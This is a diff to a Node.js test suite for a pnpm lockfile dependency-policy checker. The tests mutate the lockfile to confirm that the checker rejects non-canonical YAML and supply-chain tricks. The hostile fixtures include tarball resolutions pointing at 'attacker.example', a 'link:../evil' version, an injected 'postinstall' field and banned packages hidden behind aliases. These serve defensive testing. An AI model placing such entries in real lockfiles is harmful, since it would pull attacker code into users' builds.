@@ -6,13 +6,7 @@ import { dirname, join } from 'node:path';
 import { after, beforeEach, describe, it } from 'node:test';
 import { fileURLToPath } from 'node:url';
 
-import {
-  checkPolicy,
-  lockfileStructureErrors,
-  nameFromLockKey,
-  parseWorkspaceYaml,
-  readLockfile,
-} from './check-dependency-policy.mjs';
+import { checkPolicy, nameFromLockKey, parseLockfile, parseWorkspaceYaml } from './check-dependency-policy.mjs';
 
 const webDir = join(dirname(fileURLToPath(import.meta.url)), '..');
 const scratch = [];
@@ -197,64 +191,51 @@ describe('pnpm and npm settings', () => {
 });
 
 describe('lockfile', () => {
-  const lock = [
-    "lockfileVersion: '9.0'",
-    '',
-    'packages:',
-    '',
-    "  '@remix-run/node@2.0.0':",
-    '    resolution: {integrity: sha512-abc}',
-    '',
-    '  react-server-dom-webpack@19.0.0:',
-    '    resolution: {integrity: sha512-abc}',
-    '',
-    '  evil@1.0.0:',
-    '    resolution: {tarball: https://example.invalid/evil.tgz}',
-    '',
-    'snapshots:',
-    '',
-    '  next@15.0.0(react@19.0.0):',
-    '    dependencies:',
-    '      react: 19.0.0',
-    '',
-  ].join('\n');
+  const lockPath = join(webDir, 'pnpm-lock.yaml');
+  const committed = readFileSync(lockPath, 'utf8');
+
+  it('parses the committed lockfile without errors and sees every package', () => {
+    const { errors, names } = parseLockfile(committed);
+    assert.deepEqual(errors, []);
+    for (const name of ['react', 'react-dom', 'vite', '@playwright/test', 'rolldown']) assert.ok(names.has(name), name);
+  });
 
   it('extracts scoped and unscoped package names', () => {
     assert.equal(nameFromLockKey('@types/react@19.0.0'), '@types/react');
     assert.equal(nameFromLockKey('react-dom@19.0.0(react@19.0.0)'), 'react-dom');
-    const { names } = readLockfile(lock);
-    assert.ok(names.has('@remix-run/node'));
-    assert.ok(names.has('react-server-dom-webpack'));
-    assert.ok(names.has('next'));
   });
 
-  it('accepts the committed lockfile as canonical', () => {
-    assert.deepEqual(lockfileStructureErrors(readFileSync(join(webDir, 'pnpm-lock.yaml'), 'utf8')), []);
-  });
-
+  // Each case is a spelling YAML (and pnpm) would accept but that is not canonical, or a
+  // payload hidden in a canonical-looking file. All must fail rather than be read differently.
   for (const [name, mutate, expected] of [
-    [
-      'quoted section keys',
-      (t) => t.replace('\npackages:', "\n'packages':").replace('\nsnapshots:', "\n'snapshots':"),
-      'unexpected top-level entry',
-    ],
+    ['quoted section keys', (t) => t.replace('\npackages:', "\n'packages':"), 'quoted key "packages"'],
     [
       're-indented entries',
       (t) => t.replace("\n  '@cacheable/memory@2.2.0':", "\n   '@cacheable/memory@2.2.0':"),
       'odd indentation',
     ],
-    ['an extra top-level key', (t) => `${t}\noverrides:\n  react: 19.0.0\n`, 'unexpected top-level entry'],
+    [
+      'an entry nested under another',
+      (t) => t.replace('\n  acorn@8.19.0: {}', '\n    acorn@8.19.0: {}'),
+      'unexpected key',
+    ],
+    ['an extra top-level key', (t) => `${t}\noverrides:\n  react: 19.0.0\n`, 'unexpected key "overrides"'],
+    [
+      'a duplicate key',
+      (t) => t.replace('\n  acorn@8.19.0: {}', '\n  acorn@8.19.0: {}\n  acorn@8.19.0: {}'),
+      'duplicate key',
+    ],
     [
       'anchors and aliases',
       (t) => t.replace('autoInstallPeers: true', 'autoInstallPeers: &x true'),
-      'anchors, aliases',
+      'must be true or false',
     ],
-    ['a second YAML document', (t) => `${t}\n---\npackages: {}\n`, 'multiple YAML documents'],
+    ['a second YAML document', (t) => `${t}\n---\npackages: {}\n`, 'not a canonical'],
     ['tabs', (t) => t.replace('  autoInstallPeers', '\tautoInstallPeers'), 'tabs'],
     [
       'a flow-style packages section',
       (t) => t.replace('\npackages:\n', '\npackages: {next@15.0.0: {}}\n'),
-      'unexpected value for "packages"',
+      'must be a block',
     ],
     [
       'a quoted resolution key pointing at a tarball',
@@ -263,41 +244,56 @@ describe('lockfile', () => {
           /\n {4}resolution: \{integrity: (sha512-[^}]+)\}/,
           "\n    'resolution': {tarball: https://attacker.example/pkg.tgz, integrity: $1}",
         ),
-      'quoted key "resolution" is not canonical',
+      'quoted key "resolution"',
+    ],
+    [
+      'a tarball next to the integrity',
+      (t) =>
+        t.replace(
+          /\n {4}resolution: \{integrity: (sha512-[^}]+)\}/,
+          '\n    resolution: {integrity: $1, tarball: https://attacker.example/x.tgz}',
+        ),
+      'canonical registry resolution',
     ],
     [
       'a double-quoted, escaped package key',
       (t) => t.replace("\n  '@cacheable/memory@2.2.0':", '\n  "\\x6eext@15.0.0":'),
-      'double-quoted or escaped keys',
+      'not a canonical',
     ],
+    ['a protocol in a version', (t) => t.replace(/(\n {8}version: )19\.3\.0/, '$1link:../evil'), 'plain version'],
     [
-      'a package without its canonical resolution',
-      (t) =>
-        t.replace(
-          /\n {4}resolution: \{integrity: sha512-[^}]+\}/,
-          '\n    resolution: {integrity: sha512-x, tarball: https://attacker.example/x.tgz}',
-        ),
-      'non-canonical resolution',
+      'an unknown package field',
+      (t) => t.replace('\n    hasBin: true', '\n    hasBin: true\n    postinstall: evil'),
+      'unexpected key "postinstall"',
     ],
   ]) {
-    it(`fails on ${name} in the lockfile`, () => {
+    it(`fails on ${name}`, () => {
       const dir = fixture();
       editText(dir, 'pnpm-lock.yaml', mutate);
+      const errors = checkPolicy(dir);
       assert.ok(
-        checkPolicy(dir).some((e) => e.includes(expected)),
-        checkPolicy(dir).join('\n'),
+        errors.some((e) => e.includes(expected)),
+        errors.join('\n'),
       );
     });
   }
 
-  it('fails on banned transitive packages and non-registry resolutions', () => {
+  it('fails on banned packages anywhere in the lockfile, including aliases and peer names', () => {
     const dir = fixture();
-    writeFileSync(join(dir, 'pnpm-lock.yaml'), lock);
+    editText(dir, 'pnpm-lock.yaml', (t) =>
+      t
+        .replace('\n  acorn@8.19.0: {}', '\n  acorn@8.19.0:\n    dependencies:\n      innocent: next@15.0.0')
+        .replace('\nsnapshots:\n', "\nsnapshots:\n\n  '@remix-run/node@2.0.0': {}\n"),
+    );
     const errors = checkPolicy(dir);
-    assert.ok(errors.some((e) => e.includes('pnpm-lock.yaml: banned package "next"')));
-    assert.ok(errors.some((e) => e.includes('banned package "react-server-dom-webpack"')));
-    assert.ok(errors.some((e) => e.includes('banned package "@remix-run/node"')));
-    assert.ok(errors.some((e) => e.includes('non-registry resolution is not allowed: evil@1.0.0')));
+    assert.ok(
+      errors.some((e) => e.includes('banned package "next"')),
+      errors.join('\n'),
+    );
+    assert.ok(
+      errors.some((e) => e.includes('banned package "@remix-run/node"')),
+      errors.join('\n'),
+    );
   });
 });
 
